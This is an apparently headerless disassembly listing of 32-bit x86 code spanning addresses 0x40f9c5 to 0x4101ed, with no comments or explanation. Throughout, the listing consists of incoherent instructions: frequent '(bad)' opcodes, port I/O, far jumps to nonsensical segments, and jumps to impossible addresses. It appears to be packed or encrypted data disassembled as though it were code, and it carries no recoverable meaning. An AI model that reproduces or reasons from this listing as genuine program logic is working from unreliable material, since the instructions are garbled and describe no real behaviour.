  40f9c5:	icebp  
  40f9c6:	stc    
  40f9c7:	sti    
  40f9c8:	(bad)  
  40f9ca:	add    edi,edi
  40f9cc:	in     al,dx
  40f9cd:	mov    ebp,0xe601e2c5
  40f9d2:	loope  0x40f9df
  40f9d4:	hlt    
  40f9d5:	std    
  40f9d6:	add    eax,0xb2def3e5
  40f9db:	(bad)  
  40f9dc:	cmc    
  40f9dd:	in     al,dx
  40f9de:	in     al,0xd4
  40f9e0:	(bad)  
  40f9e2:	repnz cli 
  40f9e4:	jmp    0x40f9d2
  40f9e6:	(bad)  
  40f9e7:	out    dx,al
  40f9e8:	aad    0xdd
  40f9ea:	into   
  40f9eb:	in     eax,0xe3
  40f9ed:	rol    DWORD PTR [edx],1
  40f9ef:	inc    dh
  40f9f1:	(bad)  
  40f9f2:	loopne 0x40f9ec
  40f9f4:	retf   0xcfdc
  40f9f7:	lds    ebp,FWORD PTR [ebp-0x332b093c]
  40f9fd:	(bad)  
  40f9fe:	repnz ror bh,1
  40fa01:	mov    dh,0xdd
  40fa03:	leave  
  40fa04:	jecxz  0x40f9d1
  40fa06:	sar    ah,cl
  40fa08:	in     al,dx
  40fa09:	fdivrp st(3),st
  40fa0b:	fcomi  st,st(1)
  40fa0d:	retf   
  40fa0e:	fcmovbe st,st(0)
  40fa10:	test   ah,0xc7
  40fa13:	aam    0x1
  40fa15:	in     eax,0xca
  40fa17:	(bad)
  40fa1a:	out    0xdd,al
  40fa1c:	mov    dh,0xc1
  40fa1e:	out    0xd1,eax
  40fa20:	not    ah
  40fa22:	lock icebp 
  40fa24:	jmp    0xd2d0:0xfde3cafa
  40fa2b:	fnstcw WORD PTR [ebp-0x13f3a02]
  40fa31:	cmc    
  40fa32:	out    dx,al
  40fa33:	or     eax,ebp
  40fa35:	add    al,0xcb
  40fa37:	(bad)  
  40fa39:	mov    ebp,0xc8cac3d7
  40fa3e:	mov    bh,0xca
  40fa40:	(bad)  
  40fa41:	ror    bh,1
  40fa43:	enter  0xcef7,0x1
  40fa47:	mul    bh
  40fa49:	loope  0x40fa1c
  40fa4b:	test   BYTE PTR [edx],0x3
  40fa4e:	inc    ebx
  40fa50:	add    eax,0x2dfe00b
  40fa55:	fxch   st(1)
  40fa57:	scas   al,BYTE PTR es:[edi]
  40fa58:	mov    al,0xb7
  40fa5a:	enter  0xc0bd,0xe1
  40fa5e:	(bad)  
  40fa5f:	idiv   BYTE PTR [ecx-0x9190c]
  40fa65:	cmc    
  40fa66:	add    ecx,esi
  40fa68:	clc    
  40fa69:	cmc    
  40fa6a:	repnz mov esi,0xd4deeaff
  40fa70:	aam    0xca
  40fa72:	in     eax,dx
  40fa73:	std    
  40fa74:	(bad)  
  40fa75:	jmp    0xcbd2:0xe5a6f3e9
  40fa7c:	rcl    esi,1
  40fa7e:	into   
  40fa7f:	jmp    0x40fa55
  40fa81:	push   DWORD PTR [ebp-0x24e1c3c]
  40fa87:	enter  0x3f8,0xf4
  40fa8b:	add    eax,0xcbfdd9f5
  40fa90:	(bad)  
  40fa91:	jmp    0xc947be9e
  40fa96:	cli    
  40fa97:	stos   BYTE PTR es:[edi],al
  40fa98:	mov    bl,0xc3
  40fa9a:	loopne 0x40fa64
  40fa9c:	repnz int3 
  40fa9e:	jmp    0x40fa6c
  40faa0:	mov    dl,0xb4
  40faa2:	lock cli 
  40faa4:	shr    edi,cl
  40faa6:	iret   
  40faa7:	jmp    0x234f36e
  40faac:	loop   0x40fa71
  40faae:	(bad)  
  40fab0:	aam    0xe6
  40fab2:	clc    
  40fab3:	(bad)  
  40fab4:	loopne 0x40fa83
  40fab6:	or     esp,eax
  40fab8:	(bad)  
  40faba:	(bad)  
  40fabb:	(bad)  [eax+ecx*8-0x32372b34]
  40fac2:	rcl    ch,cl
  40fac4:	mov    edi,0xcfd6d1d2
  40fac9:	std    
  40faca:	rol    BYTE PTR [eax],cl
  40facc:	add    ah,ah
  40face:	(bad)  
  40facf:	or     dh,bl
  40fad1:	xlat   BYTE PTR ds:[ebx]
  40fad2:	enter  0xfce2,0x5
  40fad6:	fsubr  DWORD PTR [ecx-0x51322336]
  40fadc:	rcl    edx,cl
  40fade:	mov    bl,0xf2
  40fae0:	mul    edi
  40fae2:	out    0xd0,al
  40fae4:	std    
  40fae5:	cld    
  40fae6:	stc    
  40fae7:	fxch   st(0)
  40fae9:	shr    ah,1
  40faeb:	mov    ebp,0xfaf2c7f4
  40faf0:	cli    
  40faf1:	(bad)  
  40faf2:	leave  
  40faf3:	(bad)  
  40faf4:	aam    0xfc
  40faf6:	sar    BYTE PTR [ebp-0x2d0e3548],cl
  40fafc:	loope  0x40faf9
  40fafe:	repz out 0xeb,al
  40fb01:	mov    ah,0xdf
  40fb03:	(bad)  
  40fb04:	(bad)  [ebp-0x46240a30]
  40fb0a:	mov    esi,0x6d507d5
  40fb0f:	leave  
  40fb10:	leave  
  40fb11:	cmc    
  40fb12:	add    eax,0xcef20c0b
  40fb17:	shr    ebx,cl
  40fb19:	shr    BYTE PTR [esi-0x103d4c3a],0xb1
  40fb20:	mov    bh,0xe8
  40fb22:	call   0xeb31bae4
  40fb27:	mov    edx,0xcdc7c3f3
  40fb2c:	jecxz  0x40fb0a
  40fb2e:	div    edi
  40fb30:	fcomp  st(5)
  40fb32:	or     eax,DWORD PTR [ebx+esi*8]
  40fb35:	dec    ch
  40fb37:	out    dx,al
  40fb38:	test   eax,0xedddb0c2
  40fb3d:	ret    
  40fb3e:	call   0xd400e73e
  40fb43:	repnz repnz idiv ebx
  40fb47:	add    eax,ebx
  40fb49:	ret    
  40fb4a:	int    0xdc
  40fb4c:	pop    es
  40fb4d:	clc    
  40fb4e:	cli    
  40fb4f:	fucom  st(4)
  40fb51:	iret   
  40fb52:	sti    
  40fb53:	call   0xaf34db3b
  40fb58:	mov    cl,0xbc
  40fb5a:	jmp    0xb127ea16
  40fb5f:	imul   ah
  40fb61:	div    bh
  40fb63:	fcmovnbe st,st(3)
  40fb65:	fidivr WORD PTR [ecx-0x1184906]
  40fb6b:	fiadd  WORD PTR [edx]
  40fb6d:	loop   0x40fb4b
  40fb6f:	jecxz  0x40fb6c
  40fb71:	add    ah,dh
  40fb73:	push   cs
  40fb74:	add    al,0xe3
  40fb76:	adc    DWORD PTR [ecx-0x37493f52],edi
  40fb7c:	fdiv   QWORD PTR [edi+edx*8-0x3424170c]
  40fb83:	shl    bl,cl
  40fb85:	mov    edi,0xb5f901c9
  40fb8a:	xlat   BYTE PTR ds:[ebx]
  40fb8b:	ret    0xdaff
  40fb8e:	idiv   bl
  40fb90:	retf   0xdee1
  40fb93:	out    0xc5,eax
  40fb95:	out    0xf3,al
  40fb97:	call   0xad0fd379
  40fb9c:	into   
  40fb9d:	lock (bad) 
  40fb9f:	jmp    0x40fb89
  40fba1:	mov    edx,0xb4ececd7
  40fba6:	in     al,dx
  40fba7:	sar    DWORD PTR [edi-0x27431130],1
  40fbad:	hlt    
  40fbae:	(bad)  
  40fbb0:	std    
  40fbb1:	fsub   st,st(6)
  40fbb3:	aam    0x2
  40fbb5:	stc    
  40fbb6:	rol    dl,0xdc
  40fbb9:	in     al,0xf7
  40fbbb:	xlat   BYTE PTR ds:[ebx]
  40fbbc:	in     eax,dx
  40fbbd:	int3   
  40fbbe:	shl    ecx,1
  40fbc0:	(bad)  
  40fbc2:	iret   
  40fbc3:	in     eax,0xf7
  40fbc5:	shl    cl,1
  40fbc7:	aam    0xf2
  40fbc9:	push   es
  40fbca:	rol    ch,cl
  40fbcc:	in     eax,0xff
  40fbce:	loope  0x40fbdb
  40fbd0:	dec    BYTE PTR [edi]
  40fbd2:	(bad)  
  40fbd4:	call   0xed2cf8a7
  40fbd9:	mov    bl,0xb0
  40fbdb:	mov    bh,0xf4
  40fbdd:	rcl    edi,0xd4
  40fbe0:	retf   0xdaf0
  40fbe3:	cli    
  40fbe4:	jecxz  0x40fbc0
  40fbe6:	std    
  40fbe7:	mov    esi,0xe0fbd4dc
  40fbec:	repnz rol BYTE PTR [esi],0x7
  40fbf0:	cmc    
  40fbf1:	(bad)  
  40fbf3:	in     eax,0xca
  40fbf5:	fcom   st(2)
  40fbf7:	mov    ecx,0xc9e6ccb8
  40fbfc:	hlt    
  40fbfd:	cmc    
  40fbfe:	ret    0xd2d9
  40fc01:	lods   eax,DWORD PTR ds:[esi]
  40fc02:	call   0xf813f9eb
  40fc07:	mov    bh,0x2
  40fc09:	xlat   BYTE PTR ds:[ebx]
  40fc0a:	lock loope 0x40fbd9
  40fc0d:	ret    0xc0e4
  40fc10:	cmc    
  40fc11:	push   cs
  40fc12:	aad    0xfe
  40fc14:	add    eax,0xcbd002cb
  40fc19:	out    dx,eax
  40fc1a:	out    dx,al
  40fc1b:	aad    0xc8
  40fc1d:	mov    dh,0xd6
  40fc1f:	mul    eax
  40fc21:	mov    ecx,0xc9b4e4be
  40fc26:	(bad)  [edi+0x6f1febc]
  40fc2c:	int3   
  40fc2d:	in     al,0xfc
  40fc2f:	ret    0xc5fd
  40fc32:	cld    
  40fc33:	aad    0xef
  40fc35:	retf   0xc4c8
  40fc38:	ror    dl,cl
  40fc3a:	out    dx,eax
  40fc3b:	stos   DWORD PTR es:[edi],eax
  40fc3c:	int3   
  40fc3d:	out    dx,eax
  40fc3e:	(bad)  
  40fc3f:	in     eax,0xe8
  40fc41:	mov    cl,0xd3
  40fc43:	fdivp  st(5),st
  40fc45:	jmp    0xf11ae936
  40fc4a:	fild   WORD PTR [eax+ebx*8]
  40fc4d:	fadd   QWORD PTR [edi]
  40fc4f:	(bad)  
  40fc50:	or     eax,DWORD PTR [eax]
  40fc52:	out    0xc4,al
  40fc54:	sti    
  40fc55:	fdivrp st(3),st
  40fc57:	(bad)
  40fc5a:	lock hlt 
  40fc5c:	shl    DWORD PTR [esi-0x524d283a],0xd3
  40fc63:	in     eax,0xed
  40fc65:	std    
  40fc66:	loop   0x40fc5d
  40fc68:	sar    DWORD PTR [edi-0x28fe2707],0xf8
  40fc6f:	fcmovu st,st(2)
  40fc71:	test   DWORD PTR [ebx],0x2db05ea
  40fc77:	mov    ebp,0xc3f1b7d1
  40fc7c:	enter  0xd9cd,0xe8
  40fc80:	ror    ah,1
  40fc82:	repnz (bad) 
  40fc84:	cld    
  40fc85:	div    edi
  40fc87:	(bad)  
  40fc88:	call   0xfd26f283
  40fc8d:	jmp    0xebd4:0xd701f0e5
  40fc94:	out    dx,al
  40fc95:	(bad)  
  40fc97:	fsub   st(7),st
  40fc99:	lods   al,BYTE PTR ds:[esi]
  40fc9a:	lods   al,BYTE PTR ds:[esi]
  40fc9b:	mov    bl,0xc0
  40fc9d:	mov    ebx,0xe4eee7b7
  40fca2:	mov    al,0xce
  40fca4:	shl    esp,cl
  40fca6:	std    
  40fca7:	(bad)  
  40fca8:	fsub   st,st(6)
  40fcaa:	loopne 0x40fc92
  40fcac:	icebp  
  40fcad:	jecxz  0x40fc8c
  40fcaf:	or     bl,bl
  40fcb1:	(bad)  
  40fcb2:	fsincos 
  40fcb4:	adc    ebx,ebp
  40fcb6:	or     eax,0xb6f0c5ab
  40fcbb:	mov    ch,0xb4
  40fcbd:	loopne 0x40fca9
  40fcbf:	rcl    ch,1
  40fcc1:	repnz fcmovbe st,st(6)
  40fcc4:	int    0xdb
  40fcc6:	cli    
  40fcc7:	in     eax,dx
  40fcc8:	rol    dl,cl
  40fcca:	aad    0xc1
  40fccc:	rol    DWORD PTR [ecx],cl
  40fcce:	cli    
  40fccf:	call   0xc409ff96
  40fcd4:	add    al,0xcc
  40fcd6:	add    eax,ebp
  40fcd8:	jmp    0xef2cf28f
  40fcdd:	rcl    ah,cl
  40fcdf:	(bad)  
  40fce2:	jmp    0xb8f9c8ac
  40fce7:	loope  0x40fcc9
  40fce9:	int3   
  40fcea:	ret    
  40fceb:	in     eax,dx
  40fcec:	(bad)
  40fcef:	add    bh,dh
  40fcf1:	leave  
  40fcf2:	fsubp  st(7),st
  40fcf4:	loopne 0x40fcf7
  40fcf6:	clc    
  40fcf7:	ret    0xe5e9
  40fcfa:	xlat   BYTE PTR ds:[ebx]
  40fcfb:	(bad)  
  40fcfc:	mul    edi
  40fcfe:	test   al,0xcb
  40fd00:	in     al,0xd6
  40fd02:	call   0xbf2dcafe
  40fd07:	int3   
  40fd08:	shl    edi,0xf7
  40fd0b:	aam    0xc2
  40fd0d:	(bad)  
  40fd0e:	fsubrp st(2),st
  40fd10:	loop   0x40fd20
  40fd12:	les    eax,FWORD PTR [esi]
  40fd14:	(bad)
  40fd17:	int    0xc4
  40fd19:	repnz aad 0xb7
  40fd1c:	jmp    0xfb05ec06
  40fd21:	(bad)  
  40fd22:	into   
  40fd23:	(bad)
  40fd26:	mov    ebx,0xdaeddcfd
  40fd2b:	lock fdivp st(7),st
  40fd2e:	clc    
  40fd2f:	icebp  
  40fd30:	add    al,0xfe
  40fd32:	(bad)  
  40fd35:	add    eax,0xecafef05
  40fd3a:	out    dx,eax
  40fd3b:	repnz (bad) 
  40fd3d:	int    0xba
  40fd3f:	iret   
  40fd40:	scas   al,BYTE PTR es:[edi]
  40fd41:	mov    ebx,0xd5dbcade
  40fd46:	in     eax,dx
  40fd47:	mov    eax,0x2bfc703
  40fd4c:	jecxz  0x40fd2c
  40fd4e:	rcl    cl,cl
  40fd50:	ret    0xdc01
  40fd53:	jmp    0xbec7:0xd8e30bdb
  40fd5a:	in     eax,dx
  40fd5b:	(bad)
  40fd5e:	repz ror esi,0xe9
  40fd62:	call   0xeb0dd75b
  40fd67:	rcl    esi,0xf7
  40fd6a:	sar    dh,0xc2
  40fd6d:	shl    ebp,1
  40fd6f:	add    al,0x8
  40fd71:	cmc    
  40fd72:	fucomip st,st(2)
  40fd74:	lds    eax,FWORD PTR [ebx]
  40fd76:	leave  
  40fd77:	test   al,0xc8
  40fd79:	fucomip st,st(0)
  40fd7b:	mov    dl,0xc1
  40fd7e:	mov    ebx,0xf2c7cbc0
  40fd83:	retf   0xfbed
  40fd86:	std    
  40fd87:	icebp  
  40fd88:	push   edi
  40fd8a:	into   
  40fd8b:	push   es
  40fd8c:	rcr    edi,1
  40fd8e:	stc    
  40fd8f:	pop    es
  40fd90:	hlt    
  40fd91:	in     eax,0xe
  40fd93:	int    0xf8
  40fd95:	out    dx,eax
  40fd96:	jmp    0x40fd86
  40fd98:	retf   
  40fd99:	fsub   st(2),st
  40fd9b:	scas   al,BYTE PTR es:[edi]
  40fd9c:	into   
  40fd9d:	leave  
  40fd9e:	jmp    0xe4ff:0xefcad0f4
  40fda5:	retf   0xc9fb
  40fda8:	sti    
  40fda9:	out    0xf0,al
  40fdab:	mov    dh,0xe5
  40fdae:	jecxz  0x40fd94
  40fdb0:	out    0xcb,al
  40fdb2:	aad    0xc8
  40fdb4:	call   0xf80409c8
  40fdb9:	fmulp  st(7),st
  40fdbb:	retf   
  40fdbc:	scas   al,BYTE PTR es:[edi]
  40fdbd:	(bad)  
  40fdbf:	cmc    
  40fdc0:	rol    esp,1
  40fdc2:	call   0xe936cab7
  40fdc7:	repz add cl,dh
  40fdca:	fucom  st(3)
  40fdcc:	aam    0x7
  40fdce:	out    0xc6,eax
  40fdd0:	xlat   BYTE PTR ds:[ebx]
  40fdd1:	(bad)  
  40fdd3:	in     al,0xe0
  40fdd5:	sar    ecx,0xc9
  40fdd8:	test   eax,0xcab1ecbe
  40fddd:	jmp    0xd935b5dc
  40fde2:	mov    ebx,0xbdd6bcb5
  40fde7:	xlat   BYTE PTR ds:[ebx]
  40fde8:	fcmovnu st,st(1)
  40fdea:	std    
  40fdeb:	std    
  40fdec:	cli    
  40fded:	sti    
  40fdee:	mov    eax,0xffe5d90a
  40fdf3:	lds    ecx,FWORD PTR [ebx]
  40fdf5:	in     al,0xfd
  40fdf7:	mov    cl,0xb0
  40fdf9:	int3   
  40fdfa:	mov    ebp,0xb7c2caf1
  40fdff:	icebp  
  40fe00:	shl    dh,0xe9
  40fe03:	mov    ebp,0xbaf6c9ef
  40fe08:	enter  0x7db,0xf8
  40fe0c:	(bad)  
  40fe0d:	retf   
  40fe0e:	fxch   st(2)
  40fe10:	aad    0xdc
  40fe12:	in     eax,0xe3
  40fe14:	aam    0x3
  40fe16:	ud1    ebp,esi
  40fe19:	test   al,0xed
  40fe1b:	xlat   BYTE PTR ds:[ebx]
  40fe1c:	jmp    0xf0ef:0xcad3e7ce
  40fe23:	lock int 0xf4
  40fe26:	out    dx,eax
  40fe27:	add    DWORD PTR [edi],eax
  40fe29:	(bad)  
  40fe2b:	add    eax,0xe6c7d4fd
  40fe30:	(bad)  
  40fe31:	sti    
  40fe32:	jmp    0x40fdfa
  40fe34:	add    eax,0xceaacae4
  40fe39:	test   edi,0xcfc8c8eb
  40fe3f:	mov    ebx,0xfce4fad7
  40fe44:	hlt    
  40fe45:	out    dx,al
  40fe46:	mov    ebx,0xc6d0f6e8
  40fe4b:	shl    ebx,0xc5
  40fe4e:	clc    
  40fe4f:	mov    edi,0x5e6d7d7
  40fe54:	hlt    
  40fe55:	loop   0x40fe68
  40fe57:	stos   DWORD PTR es:[edi],eax
  40fe58:	retf   0xf1d0
  40fe5b:	shl    ecx,1
  40fe5d:	test   bl,0xb1
  40fe60:	mov    bh,0xcf
  40fe62:	rcr    ch,1
  40fe64:	jmp    0x40fe53
  40fe66:	(bad)  
  40fe68:	sar    DWORD PTR [ebp-0x300243e],1
  40fe6e:	mov    esp,0xfee503d1
  40fe73:	retf   0xcbfb
  40fe76:	in     al,0xf0
  40fe78:	mov    eax,0xe4d6e1e2
  40fe7d:	sar    ecx,0xec
  40fe80:	(bad)  
  40fe81:	int3   
  40fe82:	retf   0xf9eb
  40fe85:	in     eax,dx
  40fe86:	lock loop 0x40fe4b
  40fe89:	in     al,dx
  40fe8a:	add    eax,0xbbcc1e0
  40fe8f:	stc    
  40fe90:	add    dh,ah
  40fe92:	or     eax,ebp
  40fe94:	add    al,ch
  40fe96:	rol    ah,cl
  40fe98:	loopne 0x40fe7a
  40fe9a:	lods   al,BYTE PTR ds:[esi]
  40fe9b:	ret    
  40fe9c:	shr    esi,0xbb
  40fe9f:	mov    bl,0xfa
  40fea1:	(bad)  
  40fea3:	lds    edi,FWORD PTR [esi-0x433292b]
  40fea9:	repz fcom st(3)
  40feac:	fsub   st,st(6)
  40feae:	loope  0x40feb7
  40feb0:	aad    0xf4
  40feb2:	pop    es
  40feb3:	aam    0xfb
  40feb5:	(bad)  
  40feb6:	call   ecx
  40feb8:	fistp  QWORD PTR [edi+edx*8-0x1335093a]
  40febf:	(bad)  
  40fec0:	fdivr  DWORD PTR [ebx-0x6281725]
  40fec6:	mov    ebp,0xcdf4d9cd
  40fecb:	add    ah,bl
  40fecd:	mov    ecx,0xf903faf7
  40fed2:	aam    0xc8
  40fed4:	out    0xe6,eax
  40fed6:	or     al,0xb9
  40fed8:	repnz bnd jmp 0x40fec6
  40fedc:	aam    0xf6
  40fede:	(bad)  
  40fee0:	shr    dh,cl
  40fee2:	shl    esp,1
  40fee4:	out    dx,eax
  40fee5:	fdivr  st(4),st
  40fee7:	aam    0xb6
  40fee9:	jecxz  0x40fec6
  40feeb:	rcl    dh,1
  40feed:	mov    ecx,0xfd06dae0
  40fef2:	jecxz  0x40feb7
  40fef4:	iret   
  40fef5:	or     ah,ch
  40fef7:	lock lods al,BYTE PTR ds:[esi]
  40fef9:	lock ret 0xf3cf
  40fefd:	out    0xc4,al
  40feff:	imul   ebp
  40ff01:	out    0xfd,eax
  40ff03:	fucomip st,st(6)
  40ff05:	fcmovne st,st(2)
  40ff07:	jmp    0xd81ad109
  40ff0c:	rcl    cl,cl
  40ff0e:	jmp    0x40ff04
  40ff10:	retf   
  40ff11:	(bad)  
  40ff12:	cmc    
  40ff13:	out    dx,al
  40ff14:	jmp    0xeb2c0f12
  40ff19:	fdiv   QWORD PTR [edi-0x62d0832]
  40ff1f:	hlt    
  40ff20:	in     al,dx
  40ff21:	lock jmp 0xe1f6ef1d
  40ff27:	mov    edi,0xd000e0d0
  40ff2c:	test   ch,0xdd
  40ff2f:	jmp    0xe240012a
  40ff34:	add    DWORD PTR [eax+edi*8],eax
  40ff37:	stos   BYTE PTR es:[edi],al
  40ff38:	(bad)  [edi-0x17291054]
  40ff3e:	cli    
  40ff3f:	int3   
  40ff40:	mov    dh,0xf2
  40ff42:	xlat   BYTE PTR ds:[ebx]
  40ff43:	repz div eax
  40ff46:	out    dx,eax
  40ff47:	enter  0xbed5,0xbc
  40ff4b:	add    eax,0xe505c1d0
  40ff50:	cmc    
  40ff51:	loop   0x40ff49
  40ff53:	hlt    
  40ff54:	in     al,dx
  40ff55:	pxor   mm4,mm2
  40ff58:	shl    DWORD PTR [ebp-0x1e11493b],0xa8
  40ff5f:	repz mov cl,0xdb
  40ff62:	int    0xf8
  40ff64:	fmul   st(0),st
  40ff66:	call   0xe748d026
  40ff6b:	ret    
  40ff6c:	jmp    0x40ff3f
  40ff6e:	sti    
  40ff6f:	clc    
  40ff70:	out    0x6,eax
  40ff72:	or     eax,esp
  40ff74:	add    esp,esp
  40ff76:	icebp  
  40ff77:	shl    ah,cl
  40ff79:	rcl    eax,1
  40ff7b:	shl    DWORD PTR [edi-0x13173526],cl
  40ff81:	int    0xda
  40ff83:	mov    esi,0xcce8fbd1
  40ff88:	jecxz  0x40ff79
  40ff8a:	in     eax,dx
  40ff8b:	out    0x1,al
  40ff8d:	cli    
  40ff8e:	mov    esp,0x2c405d8
  40ff93:	add    al,0xe2
  40ff95:	(bad)  
  40ff97:	fucom  st(5)
  40ff99:	(bad)  
  40ff9a:	call   0xfa28c862
  40ff9f:	mov    ecx,0xffdbe7d5
  40ffa4:	std    
  40ffa5:	shl    esi,1
  40ffa7:	repz idiv bl
  40ffaa:	push   es
  40ffab:	(bad)  
  40ffac:	loop   0x40ffa1
  40ffae:	imul   eax
  40ffb0:	shr    cl,1
  40ffb2:	add    al,ch
  40ffb4:	fdiv   st(2),st
  40ffb6:	out    dx,al
  40ffb7:	lods   eax,DWORD PTR ds:[esi]
  40ffb8:	sar    DWORD PTR [edi-0x3c3c4f4d],cl
  40ffbe:	in     eax,0xed
  40ffc0:	mov    ecx,0xd2d7ebc4
  40ffc5:	int3   
  40ffc6:	inc    BYTE PTR [ecx]
  40ffc8:	aad    0xe0
  40ffca:	hlt    
  40ffcb:	aad    0xec
  40ffcd:	jecxz  0x40ffd9
  40ffcf:	add    ah,bh
  40ffd1:	or     DWORD PTR [esi+ebx*8],eax
  40ffd4:	fst    st(3)
  40ffd6:	fsubr  st(6),st
  40ffd8:	jmp    0x40ff98
  40ffda:	enter  0xe2c3,0xea
  40ffde:	mov    edx,0xeadbedb9
  40ffe3:	retf   0xedcd
  40ffe6:	cli    
  40ffe7:	ret    0xc2e3
  40ffea:	cmc    
  40ffeb:	pop    es
  40ffec:	loope  0x40ffd8
  40ffee:	mov    DWORD PTR [edx],0xcbd6c9cb
  40fff4:	ret    0xe50d
  40fff7:	lods   al,BYTE PTR ds:[esi]
  40fff8:	mov    eax,0xe9d2bcd6
  40fffd:	jecxz  0x40ffcf
  40ffff:	int3   
  410000:	loopne 0x40ffe6
  410002:	int    0xd3
  410004:	icebp  
  410005:	rcl    dl,cl
  410007:	mov    edi,0xe301bce0
  41000c:	(bad)  
  41000d:	fst    st(2)
  41000f:	fucomp st(3)
  410011:	add    cl,BYTE PTR [edx]
  410013:	(bad)  
  410014:	fxch   st(3)
  410016:	push   es
  410017:	out    0xf3,eax
  410019:	icebp  
  41001a:	ret    
  41001b:	mul    bl
  41001d:	loope  0x40ffe1
  41001f:	scas   eax,DWORD PTR es:[edi]
  410020:	repnz lock xlat BYTE PTR ds:[ebx]
  410023:	hlt    
  410024:	shl    BYTE PTR [ebp+ecx*8-0x223f0d14],cl
  41002b:	push   es
  41002c:	test   BYTE PTR [edi],0xca
  41002f:	lock neg ebx
  410032:	add    bl,ah
  410034:	jmp    0x40fffe
  410036:	push   es
  410037:	out    dx,al
  410038:	retf   0xecc5
  41003b:	(bad)  
  41003c:	mov    dh,0xe0
  41003e:	(bad)
  410041:	mov    bh,0xf4
  410043:	icebp  
  410044:	mov    ah,0x2
  410046:	mov    eax,0x3ceda03
  41004b:	repz rol DWORD PTR [ebx],1
  41004e:	fcomip st,st(4)
  410050:	jmp    0xcbcc:0xe9dfc9c5
  410057:	fldcw  WORD PTR [eax-0xc0e1a35]
  41005d:	mov    cl,0xcf
  41005f:	in     eax,0xee
  410061:	mov    ch,0xd4
  410063:	icebp  
  410064:	enter  0xf7d3,0xd3
  410068:	ret    
  410069:	mov    edi,0xdef3f5be
  41006e:	(bad)  
  410070:	add    al,0xea
  410072:	pminub mm0,mm2
  410075:	enter  0xaaf8,0xca
  410079:	(bad)  
  41007b:	int3   
  41007c:	leave  
  41007d:	shl    ebp,0xea
  410080:	scas   al,BYTE PTR es:[edi]
  410081:	into   
  410082:	(bad)
  410085:	int    0xbe
  410087:	fnstsw WORD PTR [edi+0x1e7e2fd]
  41008d:	or     ebx,edx
  41008f:	stc    
  410090:	or     ebp,esp
  410092:	pop    es
  410093:	sti    
  410094:	(bad)  
  410096:	or     eax,0xc3c4afae
  41009b:	(bad)
  41009e:	mov    cl,0xb6
  4100a0:	rcl    dh,cl
  4100a2:	mov    bh,0xbf
  4100a4:	mov    eax,0xccfbf1f6
  4100a9:	mov    edi,0xcbd2c3d5
  4100ae:	repnz in eax,0xe5
  4100b1:	sti    
  4100b2:	out    dx,eax
  4100b3:	or     al,0xea
  4100b5:	stc    
  4100b6:	(bad)  
  4100b8:	(bad)
  4100bb:	mov    dl,0xb6
  4100bd:	hlt    
  4100be:	div    esi
  4100c0:	mov    bh,0xcc
  4100c2:	retf   0xeebb
  4100c5:	hlt    
  4100c6:	int3   
  4100c7:	mov    ecx,0x3dcdeed
  4100cc:	cmc    
  4100cd:	jmp    0x4100b2
  4100cf:	(bad)  
  4100d1:	push   es
  4100d2:	(bad)  
  4100d4:	out    dx,eax
  4100d5:	add    al,bh
  4100d7:	retf   0xe1cf
  4100da:	loop   0x4100bd
  4100dc:	lods   eax,DWORD PTR ds:[esi]
  4100dd:	out    0xef,eax
  4100df:	rol    eax,0xad
  4100e2:	out    dx,al
  4100e3:	hlt    
  4100e4:	aam    0xd6
  4100e6:	fsubrp st(3),st
  4100e8:	(bad)  
  4100ea:	fadd   st(1),st
  4100ec:	mov    ebp,0xf7dfd6c5
  4100f2:	jmp    0x121d0bf0
  4100f7:	rcl    bl,1
  4100f9:	jecxz  0x4100cb
  4100fb:	stos   DWORD PTR es:[edi],eax
  4100fc:	shl    BYTE PTR [eax-0xb320f],1
  410102:	out    0xbd,al
  410104:	fcom   st(3)
  410106:	ror    edi,cl
  410108:	add    edx,ebx
  41010a:	shl    dh,1
  41010c:	icebp  
  41010d:	xlat   BYTE PTR ds:[ebx]
  41010e:	add    ah,dl
  410110:	(bad)  
  410112:	or     BYTE PTR [edx],al
  410114:	(bad)
  410117:	out    0xcc,eax
  410119:	jmp    0x410106
  41011b:	ret    0xe7d1
  41011e:	icebp  
  41011f:	scas   eax,DWORD PTR es:[edi]
  410120:	rol    dh,0xcb
  410123:	retf   0xcbc8
  410126:	lock std 
  410128:	add    edi,eax
  41012a:	in     eax,dx
  41012b:	pop    es
  41012c:	loopne 0x4100f9
  41012e:	add    eax,eax
  410130:	ret    0xfae2
  410133:	inc    esi
  410135:	out    dx,eax
  410136:	(bad)  
  410138:	fdiv   st,st(2)
  41013a:	into   
  41013b:	jmp    0xe9e9e90c
  410140:	stc    
  410141:	(bad)  
  410142:	(bad)  
  410143:	stc    
  410144:	mov    esp,0xd4f4e1cf
  410149:	in     al,dx
  41014a:	mov    BYTE PTR [ebx],0xfe
  41014d:	retf   
  41014e:	mov    esp,0xc0e5e0dd
  410153:	(bad)
  410156:	add    al,0xa8
  410158:	in     al,0xcd
  41015a:	repnz retf 
  41015c:	jmp    0xe9ff:0xc9c7b0e4
  410163:	iret   
  410164:	fdiv   QWORD PTR [ebp-0x21170d44]
  41016a:	add    eax,0xfdc2f0bc
  41016f:	(bad)  
  410170:	(bad)  
  410172:	add    BYTE PTR [esi],al
  410174:	(bad)  
  410175:	fucomip st,st(1)
  410177:	in     eax,dx
  410178:	mov    edi,0xf7c3e0b3
  41017d:	into   
  41017e:	call   0xe50ebc63
  410183:	(bad)  
  410184:	(bad)  
  410185:	mov    esi,0xffd5d402
  41018a:	(bad)  
  41018c:	repnz loope 0x410198
  41018f:	add    al,0xdf
  410191:	fild   DWORD PTR [ecx]
  410193:	push   cs
  410194:	bswap  eax
  410196:	in     eax,0xc4
  410198:	lock lods eax,DWORD PTR ds:[esi]
  41019a:	shl    DWORD PTR [ebp-0x1e31312d],0xda
  4101a1:	shl    DWORD PTR [esi-0x472d3304],cl
  4101a7:	cld    
  4101a8:	fidivr DWORD PTR [ebp+ecx*8+0x2f6ebcd]
  4101af:	retf   0xf904
  4101b2:	std    
  4101b3:	fcomip st,st(4)
  4101b5:	out    dx,al
  4101b6:	loope  0x41019a
  4101b8:	iret   
  4101b9:	in     eax,dx
  4101ba:	mov    dh,0xb0
  4101bc:	loope  0x4101ab
  4101be:	(bad)
  4101c1:	repnz retf 
  4101c3:	mov    dh,0xed
  4101c5:	lock mov ebp,0xdf02f7d3
  4101cb:	ret    0x506
  4101ce:	mov    esp,0xdee4e6e1
  4101d3:	pop    es
  4101d4:	fsub   st(4),st
  4101d6:	enter  0xccf2,0xf3
  4101da:	jmp    0xfc37c6cf
  4101df:	in     al,0xd7
  4101e1:	(bad)  
  4101e3:	mov    ecx,0xfde9b5bc
  4101e8:	div    edi
  4101ea:	stc    
  4101eb:	in     eax,0xc1
  4101ed:	out    0xdd,eax
